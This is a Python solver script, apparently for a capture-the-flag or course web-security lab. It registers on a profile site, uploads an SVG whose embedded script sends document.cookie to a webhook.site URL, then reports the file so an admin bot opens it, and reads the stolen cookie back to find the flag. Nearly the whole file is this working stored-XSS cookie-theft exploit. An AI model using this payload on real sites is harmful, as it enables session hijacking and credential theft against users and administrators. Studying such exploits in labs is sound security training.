import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

# https://portswigger.net/web-security/file-upload#:~:text=Uploading%20malicious%20client%2Dside%20scripts

import io
import urllib.parse

BASE_URL = "https://profile.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite_uuid = self.get_webhooksite_uuid()
        self.webhooksite_url = f"https://webhook.site/{self.webhooksite_uuid}"
        self.webhooksite_requests_url = f"https://webhook.site/token/{self.webhooksite_uuid}/requests"

    def get_webhooksite_uuid(self):
        response = self.session.post("https://webhook.site/token")
        return response.json()["uuid"]

    def find_flag_webhooksite(self, delay_seconds=2):
        import time, json
        time.sleep(delay_seconds)
        response = self.session.get(self.webhooksite_requests_url)
        response_json = response.json()
        response_json_text = json.dumps(response_json, indent=2)
        find_flag(response_json_text)

    def generate_random_string(self, length = 10):
        import random, string
        return ''.join(random.choices(string.ascii_letters, k=length))

    def main(self):
        # Log in
        response = self.session.get(BASE_URL)
        login_url = response.url
        username = self.generate_random_string()
        response = self.session.post(login_url, data={"username": username, "password": username})
        profile_url = response.url

        # Craft SVG File Payload
        SVG_PAYLOAD = f'''<svg xmlns="http://www.w3.org/2000/svg">
    <script>
        fetch(`{self.webhooksite_url}?q=${{document.cookie}}`)
    </script>
</svg>'''
        svg_file = io.BytesIO(SVG_PAYLOAD.encode())
        svg_file.name = "profile.svg"

        # Upload SVG
        response = self.session.post(profile_url, files={"file": (svg_file.name, svg_file)})

        # Report to Admin
        url_encoded_svg_path = urllib.parse.quote(f"/profileimage/{username}.svg")
        self.session.post(f"{BASE_URL}/report", data={"path": url_encoded_svg_path})
        self.find_flag_webhooksite()

if __name__ == "__main__":
    Solver().main()
